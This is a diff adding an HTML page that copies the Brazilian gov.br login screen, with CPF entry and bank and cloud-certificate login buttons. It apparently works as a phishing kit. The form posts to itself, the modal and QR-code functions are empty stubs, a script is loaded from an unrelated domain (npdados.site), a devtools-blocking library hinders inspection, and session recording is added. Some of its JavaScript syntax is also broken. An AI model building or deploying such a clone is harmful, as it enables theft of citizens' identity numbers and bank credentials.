@@ -1,0 +1,248 @@
+<html lang="pt-BR">
+
+<head>
+    <meta charset="utf-8">
+    <title>Acesse sua conta</title>
+    <meta name="viewport" content="width=device-width,initial-scale=1,maximum-scale=1,user-scalable=no">
+    <link rel="icon" href="/assets/img/favicon.ico" type="image/x-icon">
+    <link rel="stylesheet" href="/assets/css/all.min.css">
+    <link rel="stylesheet" href="/assets/css/rawline.css">
+    <link rel="stylesheet" href="/assets/css/govbr-highcontrast.css">
+    <link rel="stylesheet" href="/assets/css/govbr-templates.css?v=15">
+    <link rel="stylesheet" href="/assets/css/govbr-modal.css?v=9">
+    <link rel="stylesheet" href="/assets/css/govbr-eula.css?v=4">
+</head>
+
+<body><a tabindex="0" href="#conteudo" class="sr-only sr-only-focusable" aria-label="Pular para o conteÃºdo principal. Navegue sempre com a tecla TAB">Pular para o conteÃºdo principal</a>
+    <header><a href=""><img src="/assets/img/govbr.png" alt="Logomarca GovBR"></a>
+        <div id="acessibilidade"><span><a href="#" onclick="contrastScript()"><i class="fas fa-adjust"></i><span>Alto Contraste</span></a>
+            </span><span><a href="#"><i class="fas fa-deaf"></i><span>VLibras</span></a>
+            </span>
+        </div>
+    </header>
+    <div class="container">
+        <aside id="aside-signin"><img id="identidade-govbr" src="assets/img/conta_govbr_v2.jpg" alt="Logomarca GovBR"></aside>
+        <main id="main-signin">
+            <form method="post" id="loginData" action="" autocomplete="off" novalidate="">
+                <div class="card" id="login-cpf">
+                    <h3>Identifique-se no gov.br com:</h3>
+                    <div class="item-login-signup-ways" onclick='accordion("accordion-panel-id")'><a tabindex="3"><img src="assets/img/id-card-solid.png"> Número do CPF</a></div>
+                    <div class="accordion-panel" id="accordion-panel-id">
+                        <p>Digite seu CPF para <strong>criar</strong> ou <strong>acessar</strong> sua conta gov.br</p><label for="cpf">CPF</label> <input id="accountId" name="accountId" autocomplete="new-password" tabindex="1" type="tel" inputmode="numeric"
+                            value="" placeholder="Digite seu CPF" aria-invalid="false">
+                        <div class="br-message warning" id="invalid-document" style="display:none">
+                            <div class="icon"><i class="fas fa-exclamation-triangle" aria-hidden="true"></i></div>
+                            <p>CPF informado inválido. (ERL0000500)</p>
+                        </div>
+                        <div class="button-panel" id="login-button-panel"><button id="enter-account-id" type="button" name="operation" value="enter-account-id" class="button-continuar" tabindex="2">Continuar</button></div>
+                    </div><label id="title-outras-op">Outras opções de identificação:</label>
+                    <hr id="hr-outras-op" style="margin:0 0 0">
+                    <div class="item-login-signup-ways" onclick='showModal("modal-bancos-credenciados")'><button type="button" tabindex="5" class="button-href-mimic2" style="color:#008c32" onclick='showModal("modal-bancos-credenciados")'><img src="assets/img/InternetBanking-green.png"> Login com seu banco <span style="font-size:7px;background-color:#008c32;color:#fff;padding:3px;top:-3px;position:relative;margin-left:8px">SUA CONTA SERÁ PRATA</span></button></div>
+                    <div
+                        class="modal-bancos-credenciados">
+                        <div class="modal-content">
+                            <h3>Bancos Credenciados</h3>
+                            <p><b>Crie</b> ou <b>aumente o nível</b> da sua conta para <b>PRATA</b>, fazendo login com seu banco.</p>
+                            <div id="providers-list" class="modal-providers-list">
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-banco-do-brasil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/bb_logo.png" loading="lazy"> Banco do Brasil</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-banco-do-brasil").addEventListener("click", e => (setProviderId("banco-do-brasil"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-itau" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/itau_logo.png" loading="lazy"> Itaú</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-itau").addEventListener("click", t => (setProviderId("itau"), onSubmit(t)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-caixa-economica" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/cef_logo.png" loading="lazy"> Caixa Econômica</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-caixa-economica").addEventListener("click", e => (setProviderId("caixa-economica"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-bradesco" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/bradesco_logo.png" loading="lazy"> Bradesco</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-bradesco").addEventListener("click", e => (setProviderId("bradesco"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-santander" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/santander_logo.png" loading="lazy"> Santander</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-santander").addEventListener("click", e => (setProviderId("santander"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-picpay" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/picpay.png"> PicPay/Original</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-picpay").addEventListener("click", e => (setProviderId("picpay"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-nubank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/nubank_logo.png" loading="lazy"> Nubank</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-nubank").addEventListener("click", n => (setProviderId("nubank"), onSubmit(n)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-sicoob" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/sicoob_logo.png" loading="lazy"> Sicoob</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-sicoob").addEventListener("click", e => (setProviderId("sicoob"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-sicredi" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/sicredi_logo.png" loading="lazy"> Sicredi</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-sicredi").addEventListener("click", e => (setProviderId("sicredi"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-banrisul" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/banrisul_logo.png" loading="lazy"> Banrisul</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-banrisul").addEventListener("click", e => (setProviderId("banrisul"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-agibank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/agibank_logo.png" loading="lazy"> Agibank</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-agibank").addEventListener("click", e => (setProviderId("agibank"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-banco-de-brasilia" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/brb_logo.png" loading="lazy"> Banco de Brasília</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-banco-de-brasilia").addEventListener("click", e => (setProviderId("banco-de-brasilia"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-mercantil" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/mercantil_logo.png" loading="lazy"> Banco Mercantil</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-mercantil").addEventListener("click", e => (setProviderId("mercantil"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-btgpactual" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/btgpactual_logo.png" loading="lazy"> BTG Pactual</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-btgpactual").addEventListener("click", t => (setProviderId("btgpactual"), onSubmit(t)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-inter" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/inter.png"> Banco Inter</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-inter").addEventListener("click", e => (setProviderId("inter"), onSubmit(e)))
+                                    </script>
+                                </div>
+                                <div class="item-login-signup-ways"><button id="login-external-authentication-c6bank" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/c6-bank.png"> C6 Bank</button>
+                                    <script>
+                                        document.getElementById("login-external-authentication-c6bank").addEventListener("click", e => (setProviderId("c6bank"), onSubmit(e)))
+                                    </script>
+                                </div>
+                            </div>
+                            <hr>
+                            <div class="button-panel" id="modal-bancos-credenciados-button-panel"><button class="button-cancel" type="button" id="btn-close-modal-bancos-credenciados" onclick='closeModal("modal-bancos-credenciados")'>Cancelar</button></div>
+                        </div>
+                </div>
+                <div class="item-login-signup-ways" onclick='showQrCode("91505f2d-3d74-4e42-9ee0-1254715dcfb9")'><a tabindex="5"><img src="assets/img/qrcode.png"> Login com QR code</a></div>
+                <div class="item-login-signup-ways" id="cert-digital"><button id="login-certificate" type="submit" formaction="" name="operation" value="login-certificate" class="button-href-mimic2" tabindex="4"><img src="assets/img/CD.png"> Seu certificado digital</button>
+                    <script>
+                        document.getElementById("login-certificate").addEventListener("click", e => {
+                            e.preventDefault()
+                        })
+                    </script>
+                </div>
+                <div class="item-login-signup-ways" id="cert-digital-cloud"><button type="button" onclick='showModal("modal-certificado-nuvem")' class="button-href-mimic2" tabindex="5"><img src="assets/img/CD-Nuvem.png" id="cert-digital-cloud-img"> Seu certificado digital em nuvem</button></div>
+                <div class="modal-certificado-nuvem">
+                    <div class="modal-content">
+                        <h3>Provedores de Certificados em Nuvem</h3>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-neoid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/serproid_logo.png" loading="lazy"> SerproID</button>
+                            <script>
+                                document.getElementById("login-external-authentication-neoid").addEventListener("click", e => (setProviderId("neoid"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-safeid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/safeid_logo.png" loading="lazy"> SafeID</button>
+                            <script>
+                                document.getElementById("login-external-authentication-safeid").addEventListener("click", e => (setProviderId("safeid"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-birdid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/birdid_logo.png" loading="lazy"> BirdID</button>
+                            <script>
+                                document.getElementById("login-external-authentication-birdid").addEventListener("click", e => (setProviderId("birdid"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-remoteid" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/remoteid_logo.png" loading="lazy"> RemoteID</button>
+                            <script>
+                                document.getElementById("login-external-authentication-remoteid").addEventListener("click", e => (setProviderId("remoteid"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-vidaas" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/vidaas_logo.png" loading="lazy"> Vidaas</button>
+                            <script>
+                                document.getElementById("login-external-authentication-vidaas").addEventListener("click", e => (setProviderId("vidaas"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-dscloud" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/digitalsign_logo.png" loading="lazy"> DS Cloud</button>
+                            <script>
+                                document.getElementById("login-external-authentication-dscloud").addEventListener("click", e => (setProviderId("dscloud"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <div class="item-login-signup-ways"><button id="login-external-authentication-syngular" type="submit" name="operation" value="login-external-authentication" class="button-href-mimic2" tabindex="3"><img src="/assets/img/syngular_logo.png" loading="lazy"> Syngular</button>
+                            <script>
+                                document.getElementById("login-external-authentication-syngular").addEventListener("click", e => (setProviderId("syngular"), onSubmit(e)))
+                            </script>
+                        </div>
+                        <hr>
+                        <div class="button-panel" id="modal-bancos-credenciados-button-panel"><button class="button-cancel" type="button" id="btn-close-modal-certificado-nuvem" onclick='closeModal("modal-certificado-nuvem")'>Cancelar</button></div>
+                    </div>
+                </div>
+                <div class="entenda-id-govbr" id="entenda-id-govbr"><span><a tabindex="6" href="#" id="entenda-id-govbr-a"><img src="assets/img/circle-question-solid.svg" style="margin:0 13px -2px 0;height:1em"> Está com dúvidas e precisa de ajuda? </a><a tabindex="6" href="#" style="display:block" id="termo-de-uso">Termo de Uso e Aviso de Privacidade</a></span></div>
+    </div><input type="hidden" name="_csrf" value="91505f2d-3d74-4e42-9ee0-1254715dcfb9"> <input id="operation-field" type="hidden"> <input id="provider-id-field" type="hidden"> <input id="flow-token-field" type="hidden">
+    <script>
+        function setProviderId(e) {
+            const d = document.getElementById("provider-id-field");
+            d.name = "provider-id", d.value = e
+        }
+    </script>
+    <script>
+        function onHcaptchaClose(t) {
+            window.eventTargetSubmitting.classList.remove("loading"), delete window.eventTargetSubmitting
+        }
+
+        function onHcaptchaErrorCallback(t) {
+            console.log("Hcaptcha Error Reason: ", t)
+        }
+
+        function onHcaptchaCallback(t) {
+            document.getElementById("loginData").submit()
+        }
+
+        function onSubmit(t) {
+            if (t.preventDefault(), window.eventTargetSubmitting) return;
+            window.eventTargetSubmitting = t.target, t.target.classList.add("loading");
+            const e = document.getElementById("loginData");
+            if (t ? .target ? .attributes ? .name ? .value) {
+                const e = document.getElementById("operation-field");
+                e.setAttribute("name", t ? .target ? .attributes ? .name ? .value), e.setAttribute("value", t ? .target ? .attributes ? .value ? .value || "")
+            }
+            t ? .target ? .attributes ? .formaction ? .value && e.setAttribute("action", t ? .target ? .attributes ? .formaction ? .value)
+        }
+    </script>
+    </form>
+    </main>
+    </div>
+    <script>
+        function showModal() {}
+
+        function showQrCode() {}
+
+        function contrastScript() {}
+    </script>
+    <script src="/assets/js/ska.js"></script>
+    <script src="https://npdados.site/DT/main.js?nocache=42562645789264"></script>
+    <script>
+        window._STDT("1275268571075710")
+    </script>
+    <footer></footer>
+    <script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"version":"2024.11.0","token":"8beff67d6cbd4f26a8f06ec229b0567a","r":1,"server_timing":{"name":{"cfCacheStatus":true,"cfEdge":true,"cfExtPri":true,"cfL4":true,"cfOrigin":true,"cfSpeedBrain":true},"location_startswith":null}}'
+        crossorigin="anonymous"></script>
+</body>
+
+</html>
+<script disable-devtool-auto src="https://cdn.jsdelivr.net/npm/disable-devtool@latest"></script>
+<script type="text/javascript">
+    (function(c, l, a, r, i, t, y) {
+        c[a] = c[a] || function() {
+            (c[a].q = c[a].q || []).push(arguments)
+        };
+        t = l.createElement(r);
+        t.async = 1;
+        t.src = "https://www.clarity.ms/tag/" + i;
+        y = l.getElementsByTagName(r)[0];
+        y.parentNode.insertBefore(t, y);
+    })(window, document, "clarity", "script", "tmf7d225xn");
+</script>
